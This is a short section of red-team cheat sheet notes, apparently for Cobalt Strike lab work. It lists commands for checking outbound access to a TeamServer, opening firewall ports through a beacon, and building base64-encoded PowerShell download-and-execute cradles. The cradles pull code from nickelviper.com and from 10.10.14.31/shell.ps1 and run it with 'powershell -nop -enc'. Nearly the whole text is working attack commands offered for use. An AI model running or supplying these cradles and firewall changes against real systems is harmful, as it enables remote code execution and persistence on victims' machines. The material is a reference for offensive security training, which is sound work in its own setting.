### Miscellaneous

```powershell
# Run a python3 webserver
$ python3 -m http.server

# Check outbound access to TeamServer
$ iwr -Uri http://nickelviper.com/a

# Change incoming firewall rules
beacon> powerpick New-NetFirewallRule -DisplayName "Test Rule" -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort 8080
beacon> powerpick Remove-NetFirewallRule -DisplayName "Test Rule"

## Encode the powershell payload for handling extra quotes 

# Powershell
PS C:\> $str = 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a"))'
PS C:\> [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))

#Linux 
$ echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.31/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0

# Final Command
powershell -nop -enc <BASE64_ENCODED_PAYLOAD>

```